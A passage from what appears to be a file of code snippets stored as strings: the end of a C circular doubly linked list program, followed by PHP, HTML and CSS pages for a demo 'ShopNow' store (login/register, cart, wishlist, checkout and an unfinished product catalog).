    if (temp->next == head && position > 0) {
        printf("Invalid position\n");
        free(newNode);
        return;
    }

    newNode->next = temp->next;
    newNode->prev = temp;
    temp->next->prev = newNode;
    temp->next = newNode;

    if (temp == tail) {
        tail = newNode;
    }
}

void deleteAtFirst() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    
    struct Node* temp = head;

    if (head == tail) { 
        free(head);
        head = tail = NULL;
        return;
    }

    head = head->next;
    head->prev = tail;
    tail->next = head;

    free(temp);
}

void deleteAtEnd() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    
    if (head == tail) { 
        free(head);
        head = tail = NULL;
        return;
    }

    struct Node* temp = tail;
    tail = tail->prev;
    tail->next = head;
    head->prev = tail;

    free(temp);
}

void deleteNPosition(int position) {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }
    if (position == 0) {
        deleteAtFirst();
        return;
    }

    struct Node* temp = head;
    
    for (int i = 0; i < position && temp->next != head; i++) {
        temp = temp->next;
    }

    if (temp == head) {
        printf("Invalid position\n");
        return;
    }

    temp->prev->next = temp->next;
    temp->next->prev = temp->prev;

    if (temp == tail) {
        tail = temp->prev;
    }

    free(temp);
}

void display() {
    if (head == NULL) {
        printf("List is empty\n");
        return;
    }

    struct Node* temp = head;
    printf("Forward: ");
    do {
        printf("%d <-> ", temp->data);
        temp = temp->next;
    } while (temp != head);
    printf("(back to head)\n");

    printf("Backward: ");
    temp = tail;
    do {
        printf("%d <-> ", temp->data);
        temp = temp->prev;
    } while (temp != tail);
    printf("(back to tail)\n");
}

int main() {
    insertAtEnd(1);
    insertAtEnd(2);
    insertAtEnd(3);
    insertAtEnd(4);
    insertAtEnd(5);
    insertAtStart(10);
    insertAtNPosition(15, 2);
    display();

    deleteAtFirst();
    deleteAtEnd();
    deleteNPosition(2);
    display();

    return 0;
}
'''

login_register= '''

loginregister.php
<?php


// CREATE DATABASE user_db;

// USE user_db;

// CREATE TABLE users (
//     id INT AUTO_INCREMENT PRIMARY KEY,
//     username VARCHAR(50) NOT NULL UNIQUE,
//     email VARCHAR(100) NOT NULL UNIQUE,
//     password VARCHAR(255) NOT NULL,
//     name VARCHAR(50) NOT NULL,
//     phone VARCHAR(20) NOT NULL,
//     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
// );



// Start a session to manage user login state
session_start();

// Connect to the MySQL database (update credentials if needed)
$conn = mysqli_connect("localhost", "root", "", "user_db");

// Check if the database connection was successful
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Handle Registration Form Submission
if (isset($_POST['register'])) {
    // Sanitize user inputs to prevent SQL injection
    $username = mysqli_real_escape_string($conn, $_POST['username']);
    $email = mysqli_real_escape_string($conn, $_POST['email']);
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT); // Hash the password for security
    $name = mysqli_real_escape_string($conn, $_POST['name']);
    $phone = mysqli_real_escape_string($conn, $_POST['phone']);

    // Check if the email already exists in the database
    $check_email = mysqli_query($conn, "SELECT email FROM users WHERE email='$email'");
    if (mysqli_num_rows($check_email) > 0) {
        $error = "Email already exists!";
    } else {
        // Insert new user into the database
        $query = "INSERT INTO users (username, email, password, name, phone) 
                  VALUES ('$username', '$email', '$password', '$name', '$phone')";
        if (mysqli_query($conn, $query)) {
            $success = "Registration successful! Please login.";
        } else {
            $error = "Registration failed!";
        }
    }
}

// Handle Login Form Submission
if (isset($_POST['login'])) {
    // Sanitize email input
    $email = mysqli_real_escape_string($conn, $_POST['email']);
    $password = $_POST['password'];

    // Query the database for the user with the provided email
    $query = "SELECT * FROM users WHERE email='$email'";
    $result = mysqli_query($conn, $query);

    if (mysqli_num_rows($result) > 0) {
        $user = mysqli_fetch_assoc($result);
        // Verify the password against the stored hash
        if (password_verify($password, $user['password'])) {
            // Set session variables and redirect to dashboard
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['username'] = $user['username'];
            header("Location: dashboard.php");
            exit();
        } else {
            $error = "Invalid password!";
        }
    } else {
        $error = "Email not found!";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Meta tags for character encoding and responsive viewport -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login & Register</title>
    <!-- Link to the external CSS file -->
    <link rel="stylesheet" href="LoginRegister.css">
</head>
<body>
    <!-- Main container for centering the forms -->
    <div class="container">
        <!-- Login Form -->
        <div class="form-box" id="login-box">
            <h2>Login</h2>
            <!-- Display error or success messages if set -->
            <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
            <?php if (isset($success)) { echo "<p class='success'>$success</p>"; } ?>
            <form action="" method="POST">
                <div class="input-group">
                    <label for="login-email">Email</label>
                    <input type="email" id="login-email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="login-password">Password</label>
                    <input type="password" id="login-password" name="password" required>
                </div>
                <button type="submit" name="login" class="btn">Login</button>
                <!-- Link to switch to registration form -->
                <p class="switch">Don't have an account? <a href="#" onclick="showRegister()">Register</a></p>
            </form>
        </div>

        <!-- Registration Form -->
        <div class="form-box" id="register-box" style="display: none;">
            <h2>Register</h2>
            <!-- Display error message if registration fails -->
            <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
            <form action="" method="POST">
                <div class="input-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="input-group">
                    <label for="name">Name</label>
                    <input type="text" id="name" name="name" required>
                </div>
                <div class="input-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <div class="input-group">
                    <label for="phone">Phone Number</label>
                    <input type="tel" id="phone" name="phone" required>
                </div>
                <button type="submit" name="register" class="btn">Register</button>
                <!-- Link to switch to login form -->
                <p class="switch">Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
            </form>
        </div>
    </div>

    <!-- JavaScript to toggle between login and registration forms -->
    <script>
        function showRegister() {
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('register-box').style.display = 'block';
        }

        function showLogin() {
            document.getElementById('register-box').style.display = 'none';
            document.getElementById('login-box').style.display = 'block';
        }
    </script>
</body>
</html>

loginregister.css
/* Reset default styles for consistency across browsers */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* Body with a clean, professional background */
body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #f7f9fc;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
}

/* Center the form container */
.container {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
}

/* Compact form box with professional styling */
.form-box {
    background: #ffffff;
    padding: 24px;
    border-radius: 10px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
    width: 100%;
    max-width: 360px; /* Reduced size for compactness */
    transition: box-shadow 0.3s ease;
}

.form-box:hover {
    box-shadow: 0 6px 24px rgba(0, 0, 0, 0.12);
}

/* Heading with clean typography */
h2 {
    text-align: center;
    margin-bottom: 20px;
    color: #1a202c;
    font-size: 24px;
    font-weight: 600;
}

/* Input group with tight spacing */
.input-group {
    margin-bottom: 16px;
}

/* Label styling for clarity */
label {
    display: block;
    margin-bottom: 6px;
    color: #4a5568;
    font-size: 14px;
    font-weight: 500;
}

/* Input fields with modern, minimal design */
input {
    width: 100%;
    padding: 10px;
    border: 1px solid #e2e8f0;
    border-radius: 6px;
    font-size: 14px;
    color: #2d3748;
    background: #f7fafc;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
}

input:focus {
    outline: none;
    border-color: #3182ce;
    box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.1);
}

/* Button with professional blue theme */
.btn {
    width: 100%;
    padding: 12px;
    background: #3182ce;
    border: none;
    border-radius: 6px;
    color: #ffffff;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s ease, transform 0.1s ease;
}

.btn:hover {
    background: #2b6cb0;
}

.btn:active {
    transform: translateY(1px);
}

/* Error and success messages with subtle styling */
.error {
    color: #e53e3e;
    text-align: center;
    margin-bottom: 12px;
    font-size: 13px;
}

.success {
    color: #38a169;
    text-align: center;
    margin-bottom: 12px;
    font-size: 13px;
}

/* Switch link for form toggling */
.switch {
    text-align: center;
    margin-top: 16px;
    font-size: 13px;
    color: #4a5568;
}

.switch a {
    color: #3182ce;
    text-decoration: none;
    font-weight: 500;
}

.switch a:hover {
    text-decoration: underline;
}

/* Responsive design for mobile devices */
@media (max-width: 400px) {
    .form-box {
        padding: 20px;
        max-width: 90%;
    }

    h2 {
        font-size: 20px;
    }

    .btn {
        padding: 10px;
    }

    input {
        padding: 8px;
        font-size: 13px;
    }
}
'''

cart='''
<?php
// Start session to access cart
session_start();

// Initialize cart if not already set
if (!isset($_SESSION['cart'])) {
    $_SESSION['cart'] = [];
}

// This part is for handling cart actions (remove, update quantity)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle remove item from cart
    if (isset($_POST['remove_item'])) {
        $product_id = intval($_POST['product_id']);
        if (isset($_SESSION['cart'][$product_id])) {
            unset($_SESSION['cart'][$product_id]);
        }
    }
    
    // Handle update quantity
    if (isset($_POST['update_quantity'])) {
        $product_id = intval($_POST['product_id']);
        $action = $_POST['action'];
        if (isset($_SESSION['cart'][$product_id])) {
            if ($action === 'increase') {
                $_SESSION['cart'][$product_id]['quantity']++;
            } elseif ($action === 'decrease' && $_SESSION['cart'][$product_id]['quantity'] > 1) {
                $_SESSION['cart'][$product_id]['quantity']--;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Meta tags for character encoding and responsive viewport -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Cart</title>
    <!-- Link to dedicated CSS for cart page -->
    <link rel="stylesheet" href="cart.css">
</head>
<body>
    <!-- Fake navigation bar for design purposes (non-functional except Shop link) -->
    <nav class="navbar">
        <div class="nav-brand">ShopNow</div>
        <ul class="nav-links">
            <li><a href="#">Home</a></li>
            <li><a href="index.php">Shop</a></li>
            <li><a href="#">Categories</a></li>
            <li><a href="cart.php">Cart</a></li>
            <li><a href="#">Wishlist</a></li>
        </ul>
    </nav>

    <!-- Main container for the cart -->
    <div class="cart-container">
        <!-- Cart section -->
        <!-- This part is for displaying and managing the cart -->
        <section class="cart-section">
            <h1>Your Cart</h1>
            <?php if (empty($_SESSION['cart'])): ?>
                <p class="no-items">Your cart is empty. <a href="index.php">Shop now</a>.</p>
            <?php else: ?>
                <div class="cart-items">
                    <?php 
                    $total = 0;
                    foreach ($_SESSION['cart'] as $id => $item): 
                        $subtotal = $item['price'] * $item['quantity'];
                        $total += $subtotal;
                    ?>
                        <!-- Cart item with quantity controls and remove button -->
                        <div class="cart-item">
                            <div class="cart-item-details">
                                <h3><?php echo htmlspecialchars($item['name']); ?></h3>
                                <p class="price">$<?php echo number_format($item['price'], 2); ?></p>
                            </div>
                            <!-- This part is for updating cart item quantity -->

                            <div class="Qnty">
                            <form method="POST" action="" class="quantity-form">
                                <input type="hidden" name="product_id" value="<?php echo $id; ?>">
                                <input type="hidden" name="action" value="decrease">
                                <button type="submit" name="update_quantity" class="quantity-btn minus">-</button>
                            </form>
                            <span class="quantity"><?php echo $item['quantity']; ?></span>
                            <form method="POST" action="" class="quantity-form">
                                <input type="hidden" name="product_id" value="<?php echo $id; ?>">
                                <input type="hidden" name="action" value="increase">
                                <button type="submit" name="update_quantity" class="quantity-btn plus">+</button>
                            </form>
                            </div>
                            <!-- This part is for removing item from cart -->
                            <form method="POST" action="">
                                <input type="hidden" name="product_id" value="<?php echo $id; ?>">
                                <button type="submit" name="remove_item" class="remove-btn">Remove</button>
                            </form>
                            <p class="subtotal">$<?php echo number_format($subtotal, 2); ?></p>
                        </div>
                    <?php endforeach; ?>
                </div>
                <!-- Cart total -->
                <div class="cart-total">
                    <span>Total</span>
                    <strong>$<?php echo number_format($total, 2); ?></strong>
                </div>
                <!-- Link to continue shopping -->
                <a href="index.php" class="btn continue-shopping">Continue Shopping</a>
                <a href="checkout.php" class="btn checkout-btn">Proceed to Checkout</a>
            <?php endif; ?>
        </section>
    </div>
</body>
</html>

cart.css
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f4f4f4;
}
.navbar {
    background-color: #333;
    color: white;
    padding: 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.navbar .nav-brand {
    font-size: 1.5em;
    font-weight: bold;
}
.nav-links {
    list-style: none;
    margin: 0;
    padding: 0;
    display: flex;
}
.nav-links li {
    margin-left: 20px;
}
.nav-links a {
    color: white;
    text-decoration: none;
}
.cart-container {
    max-width: 800px;
    margin: 20px auto;
    padding: 20px;
    background: white;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
}
.cart-section h1 {
    text-align: center;
}
.no-items {
    text-align: center;
}
.cart-items {
    margin-bottom: 20px;
}
.cart-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 0;
    border-bottom: 1px solid #eee;
}
.cart-item-details h3 {
    margin: 0;
}
.price, .subtotal {
    color: #333;
}
.Qnty {
    display: flex;
    align-items: center;
    gap: 10px;
}
.quantity-form {
    display: inline-block;
}
.quantity-btn {
    background: #ddd;
    border: none;
    padding: 5px 10px;
    cursor: pointer;
}
.quantity {
    padding: 0 10px;
}
.remove-btn {
    background: #dc3545;
    color: white;
    border: none;
    padding: 5px 10px;
    border-radius: 4px;
    cursor: pointer;
}
.cart-total {
    display: flex;
    justify-content: space-between;
    font-size: 1.2em;
    padding: 10px 0;
}
.btn {
    display: inline-block;
    padding: 10px 20px;
    color: white;
    text-decoration: none;
    border-radius: 4px;
    margin: 10px 5px;
}
.continue-shopping {
    background-color: #007bff;
}
.checkout-btn {
    background-color: #28a745;
}

'''

wishlist='''
<?php
// Start session to manage wishlist and cart
session_start();

// If wishlist is not set, initialize it as an empty array
if (!isset($_SESSION['wishlist'])) {
    $_SESSION['wishlist'] = [];
}

// Define the products array as it is
$products = [
    [
        'id' => 1,
        'name' => 'Smartphone Pro',
        'category' => 'phones',
        'price' => 799.99,
        'description' => '6.7-inch AMOLED display, 128GB storage, advanced camera system.',
        'image' => 'images/product1.jpg'
    ],
    [
        'id' => 2,
        'name' => 'Wireless Earbuds',
        'category' => 'audio',
        'price' => 149.99,
        'description' => 'Noise cancellation, 20-hour battery, crystal-clear audio.',
        'image' => 'images/product2.jpg'
    ],
    [
        'id' => 3,
        'name' => 'Fitness Smartwatch',
        'category' => 'wearables',
        'price' => 249.99,
        'description' => 'Heart rate monitoring, GPS, fitness tracking features.',
        'image' => 'images/product3.jpg'
    ],
    [
        'id' => 4,
        'name' => 'Ultralight Laptop',
        'category' => 'laptops',
        'price' => 1299.99,
        'description' => '16GB RAM, 512GB SSD, 13-inch Retina display.',
        'image' => 'images/product4.jpg'
    ]
];

// Remove product from wishlist
if (isset($_POST['remove_from_wishlist'])) {
    $product_id = intval($_POST['product_id']);
    if (($key = array_search($product_id, $_SESSION['wishlist'])) !== false) {
        unset($_SESSION['wishlist'][$key]);
    }
}

// Add product to cart
if (isset($_POST['add_to_cart'])) {
    $product_id = intval($_POST['product_id']);
    $product = null;
    foreach ($products as $p) {
        if ($p['id'] == $product_id) {
            $product = $p;
            break;
        }
    }
    if ($product) {
        // Add to cart
        if (!isset($_SESSION['cart'][$product_id])) {
            $_SESSION['cart'][$product_id] = [
                'name' => $product['name'],
                'price' => $product['price'],
                'quantity' => 1
            ];
        } else {
            $_SESSION['cart'][$product_id]['quantity']++;
        }

        // Remove from wishlist after adding to cart
        if (($key = array_search($product_id, $_SESSION['wishlist'])) !== false) {
            unset($_SESSION['wishlist'][$key]);
        }
    }
}

// Get products in the wishlist based on product IDs stored in session
$wishlist_products = [];
foreach ($_SESSION['wishlist'] as $product_id) {
    foreach ($products as $product) {
        if ($product['id'] === $product_id) {
            $wishlist_products[] = $product;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Wishlist</title>
    <link rel="stylesheet" href="wishlist.css">
</head>
<body>
    <!-- Navbar -->
    <nav class="navbar">
        <div class="nav-brand">ShopNow</div>
        <ul class="nav-links">
            <li><a href="#">Home</a></li>
            <li><a href="index.php">Shop</a></li>
            <li><a href="#">Categories</a></li>
            <li><a href="cart.php">Cart</a></li>
            <li><a href="wishlist.php">Wishlist</a></li>
        </ul>
    </nav>

    <!-- Wishlist Container -->
    <div class="wishlist-container">
        <h1>Your Wishlist</h1>
        
        <!-- Wishlist Products Section -->
        <div class="wishlist-products">
            <?php if (!empty($wishlist_products)): ?>
                <?php foreach ($wishlist_products as $product): ?>
                    <div class="product-item" data-category="<?php echo htmlspecialchars($product['category']); ?>">
                        <img src="<?php echo htmlspecialchars($product['image']); ?>" alt="<?php echo htmlspecialchars($product['name']); ?>" class="product-image">
                        <h3><?php echo htmlspecialchars($product['name']); ?></h3>
                        <p class="category"><?php echo ucfirst(htmlspecialchars($product['category'])); ?></p>
                        <p class="price">$<?php echo number_format($product['price'], 2); ?></p>
                        <p class="description"><?php echo htmlspecialchars($product['description']); ?></p>
                        <div class="product-actions">
                            <!-- Add to Cart Button -->
                            <form method="POST" action="cart.php">
                                <input type="hidden" name="product_id" value="<?php echo $product['id']; ?>">
                                <button type="submit" name="add_to_cart" class="btn add-to-cart">Add to Cart</button>
                            </form>
                            <!-- Remove from Wishlist Button -->
                            <form method="POST" action="wishlist.php">
                                <input type="hidden" name="product_id" value="<?php echo $product['id']; ?>">
                                <button type="submit" name="remove_from_wishlist" class="btn remove-btn">Remove from Wishlist</button>
                            </form>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <p class="no-products">Your wishlist is empty.</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>

wishlist.css
/* Wishlist Page Styles */
body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    background-color: #f8f9fa;
}

/* Navbar */
.navbar {
    background-color: #333;
    color: white;
    padding: 1rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.navbar .nav-brand {
    font-size: 1.5rem;
}

.navbar .nav-links {
    list-style: none;
    display: flex;
}

.navbar .nav-links li {
    margin-left: 1rem;
}

.navbar .nav-links a {
    color: white;
    text-decoration: none;
    font-size: 1rem;
}

.navbar .nav-links a:hover {
    text-decoration: underline;
}

/* Wishlist Container */
.wishlist-container {
    padding: 3rem 1rem;
    text-align: center;
}

.wishlist-container h1 {
    font-size: 2.5rem;
    margin-bottom: 2rem;
}

/* Horizontal Layout for Products */
.wishlist-products {
    display: flex;
    flex-wrap: nowrap; /* Prevent wrapping to new rows */
    gap: 1rem;
    justify-content: center;
    overflow-x: auto; /* Add horizontal scrolling if products overflow */
    padding-bottom: 1rem;
}

/* Product Item */
.product-item {
    background-color: #fff;
    padding: 1rem;
    border-radius: 8px;
    width: 250px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    transition: transform 0.2s ease-in-out;
}

.product-item:hover {
    transform: translateY(-5px);
}

.product-item img {
    width: 100%;
    height: auto;
    border-radius: 8px;
}

.product-item h3 {
    font-size: 1.2rem;
    margin-top: 1rem;
}

.product-item .category {
    color: #777;
    font-size: 1rem;
}

.product-item .price {
    font-size: 1.4rem;
    color: #28a745;
    margin: 1rem 0;
}

.product-item .description {
    font-size: 1rem;
    color: #555;
    margin-bottom: 1rem;
}

/* Buttons */
.product-item .btn {
    padding: 0.5rem 1rem;
    background-color: #28a745;
    color: white;
    border: none;
    cursor: pointer;
    border-radius: 5px;
    margin-top: 1rem;
    width: 100%;
    transition: background-color 0.3s;
}

.product-item .btn:hover {
    background-color: #218838;
}

.product-item .remove-btn {
    background-color: #dc3545;
}

.product-item .remove-btn:hover {
    background-color: #c82333;
}

.product-item .btn:active, .remove-btn:active {
    transform: scale(0.98);
}

/* Empty Wishlist */
.no-products {
    text-align: center;
    font-size: 1.2rem;
    color: #666;
}

/* Responsive Styles */
@media (max-width: 768px) {
    .wishlist-products {
        flex-direction: column;
        align-items: center;
    }

    .product-item {
        width: 80%;
    }
}

'''

checkout='''
<?php
// Start session to access cart
session_start();

// Initialize cart if not already set
if (!isset($_SESSION['cart'])) {
    $_SESSION['cart'] = [];
}

// Redirect to cart if cart is empty
if (empty($_SESSION['cart'])) {
    header("Location: cart.php");
    exit;
}

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "shopnow";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// Handle form submission
$success_message = '';
$errors = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $phone = filter_input(INPUT_POST, 'phone', FILTER_SANITIZE_STRING);
    $address = filter_input(INPUT_POST, 'address', FILTER_SANITIZE_STRING);
    $payment_method = filter_input(INPUT_POST, 'payment_method', FILTER_SANITIZE_STRING);

    // Basic validation
    if (!$name) $errors[] = "Name is required.";
    if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) $errors[] = "Valid email is required.";
    if (!$phone) $errors[] = "Phone number is required.";
    if (!$address) $errors[] = "Address is required.";
    if (!$payment_method) $errors[] = "Payment method is required.";

    if (empty($errors)) {
        try {
            // Start transaction
            $conn->beginTransaction();

            // Calculate total
            $total = 0;
            foreach ($_SESSION['cart'] as $item) {
                $total += $item['price'] * $item['quantity'];
            }

            // Insert order
            $stmt = $conn->prepare("INSERT INTO orders (customer_name, email, phone, address, payment_method, total) VALUES (?, ?, ?, ?, ?, ?)");
            $stmt->execute([$name, $email, $phone, $address, $payment_method, $total]);
            $order_id = $conn->lastInsertId();

            // Insert order items
            $stmt = $conn->prepare("INSERT INTO order_items (order_id, product_name, quantity, price) VALUES (?, ?, ?, ?)");
            foreach ($_SESSION['cart'] as $id => $item) {
                $stmt->execute([$order_id, $item['name'], $item['quantity'], $item['price']]);
            }

            // Commit transaction
            $conn->commit();

            // Clear cart
            $_SESSION['cart'] = [];
            $success_message = "Order placed successfully! Order ID: $order_id";
        } catch(PDOException $e) {
            $conn->rollBack();
            $errors[] = "Error placing order: " . $e->getMessage();
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .navbar {
            background-color: #333;
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar .nav-brand {
            font-size: 1.5em;
            font-weight: bold;
        }
        .nav-links {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
        }
        .nav-links li {
            margin-left: 20px;
        }
        .nav-links a {
            color: white;
            text-decoration: none;
        }
        .checkout-container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
        }
        .order-summary {
            margin-bottom: 20px;
        }
        .order-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }
        .total {
            font-weight: bold;
            text-align: right;
            padding: 10px 0;
        }
        .checkout-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .checkout-form label {
            font-weight: bold;
        }
        .checkout-form input, .checkout-form select, .checkout-form textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .checkout-form button {
            background-color: #28a745;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1.1em;
        }
        .checkout-form button:hover {
            background-color: #218838;
        }
        .error, .success {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 4px;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-brand">ShopNow</div>
        <ul class="nav-links">
            <li><a href="#">Home</a></li>
            <li><a href="index.php">Shop</a></li>
            <li><a href="#">Categories</a></li>
            <li><a href="cart.php">Cart</a></li>
            <li><a href="#">Wishlist</a></li>
        </ul>
    </nav>

    <div class="checkout-container">
        <h1>Checkout</h1>

        <?php if ($success_message): ?>
            <div class="success"><?php echo htmlspecialchars($success_message); ?></div>
            <p><a href="index.php">Return to Shop</a></p>
        <?php else: ?>
            <!-- Order Summary -->
            <div class="order-summary">
                <h2>Order Summary</h2>
                <?php 
                $total = 0;
                foreach ($_SESSION['cart'] as $id => $item): 
                    $subtotal = $item['price'] * $item['quantity'];
                    $total += $subtotal;
                ?>
                    <div class="order-item">
                        <span><?php echo htmlspecialchars($item['name']); ?> (x<?php echo $item['quantity']; ?>)</span>
                        <span>$<?php echo number_format($subtotal, 2); ?></span>
                    </div>
                <?php endforeach; ?>
                <div class="total">
                    Total: $<?php echo number_format($total, 2); ?>
                </div>
            </div>

            <!-- Display Errors -->
            <?php if (!empty($errors)): ?>
                <div class="error">
                    <?php foreach ($errors as $error): ?>
                        <p><?php echo htmlspecialchars($error); ?></p>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <!-- Checkout Form -->
            <form method="POST" class="checkout-form">
                <label for="name">Full Name *</label>
                <input type="text" id="name" name="name" required>

                <label for="email">Email *</label>
                <input type="email" id="email" name="email" required>

                <label for="phone">Phone Number *</label>
                <input type="tel" id="phone" name="phone" required>

                <label for="address">Delivery Address *</label>
                <textarea id="address" name="address" rows="4" required></textarea>

                <label for="payment_method">Payment Method *</label>
                <select id="payment_method" name="payment_method" required>
                    <option value="">Select Payment Method</option>
                    <option value="cod">Cash on Delivery</option>
                    <option value="credit_card">Credit Card</option>
                </select>

                <button type="submit">Place Order</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
'''

catalog='''
<?php
// Start session to manage cart
session_start();

// Initialize cart if not already set
if (!isset($_SESSION['cart'])) {
    $_SESSION['cart'] = [];
}
if (!isset($_SESSION['wishlist'])) {
    $_SESSION['wishlist'] = [];
}

if (isset($_POST['add_to_wishlist'])) {
    $product_id = intval($_POST['product_id']);
    if (!in_array($product_id, $_SESSION['wishlist'])) {
        $_SESSION['wishlist'][] = $product_id;
    }
}

// Define static products array with name, category, price, description, and image
$products = [
    [
        'id' => 1, // Unique ID for each product
        'name' => 'Smartphone Pro',
        'category' => 'phones',
        'price' => 799.99, // Numeric for calculations
        'description' => '6.7-inch AMOLED display, 128GB storage, advanced camera system.',
        'image' => 'images/product1.jpg'
    ],
    [
        'id' => 2,
        'name' => 'Wireless Earbuds',
        'category' => 'audio',
        'price' => 149.99,
        'description' => 'Noise cancellation, 20-hour battery, crystal-clear audio.',
        'image' => 'images/product2.jpg'
    ],
    [
        'id' => 3,
        'name' => 'Fitness Smartwatch',
        'category' => 'wearables',
        'price' => 249.99,
        'description' => 'Heart rate monitoring, GPS, fitness tracking features.',
        'image' => 'images/product3.jpg'
    ],
    [
        'id' => 4,
        'name' => 'Ultralight Laptop',
        'category' => 'laptops',
        'price' => 1299.99,
        'description' => '16GB RAM, 512GB SSD, 13-inch Retina display.',
        'image' => 'images/product4.jpg'
    ]
];

// Handle Add to Cart functionality
if (isset($_POST['add_to_cart'])) {
    // Get product ID from form
    $product_id = intval($_POST['product_id']);
    
    // Find product by ID
    $product = null;
    foreach ($products as $p) {
        if ($p['id'] == $product_id) {
            $product = $p;
            break;
        }
    }
    
    if ($product) {
        // Check if product is already in cart
        if (isset($_SESSION['cart'][$product_id])) {
            // Increase quantity if already in cart
            $_SESSION['cart'][$product_id]['quantity']++;
        } else {
            // Add new product to cart with quantity 1
            $_SESSION['cart'][$product_id] = [
                'name' => $product['name'],
                'price' => $product['price'],
                'quantity' => 1
            ];
        }
    }
}

// Get selected category from URL query parameter (e.g., ?category=phones)
$selected_category = isset($_GET['category']) ? strtolower($_GET['category']) : 'all';

// Get search query from the search form (if any)
$search_query = isset($_POST['search']) ? strtolower(trim($_POST['search'])) : '';

// Filter products based on selected category and search query
$filtered_products = array_filter($products, function($product) use ($selected_category, $search_query) {
    $matches_category = $selected_category === 'all' || $product['category'] === $selected_category;
    $matches_search = empty($search_query) || strpos(strtolower($product['name']), $search_query) !== false || strpos(strtolower($product['description']), $search_query) !== false;
    return $matches_category && $matches_search;
});
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Product Catalogue</title>
    <link rel="stylesheet" href="catalog.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-brand">ShopNow</div>
        <ul class="nav-links">
            <li><a href="#">Home</a></li>
            <li><a href="index.php">Shop</a></li>
            <li><a href="#">Categories</a></li>
            <li><a href="cart.php">Cart</a></li>
            <li><a href="wishlist.php">Wishlist</a></li>
        </ul>
    </nav>

    <div class="catalogue-container">
        <header class="catalogue-header">
            <h1>Explore Our Products</h1>
            <p>Browse our premium tech collection</p>
            
            <form method="POST" class="search-form">
                <input type="text" name="search" placeholder="Search products..." value="<?php echo htmlspecialchars($search_query); ?>">
                <button type="submit" class="btn search-btn">Search</button>
            </form>

            <div class="category-filter">
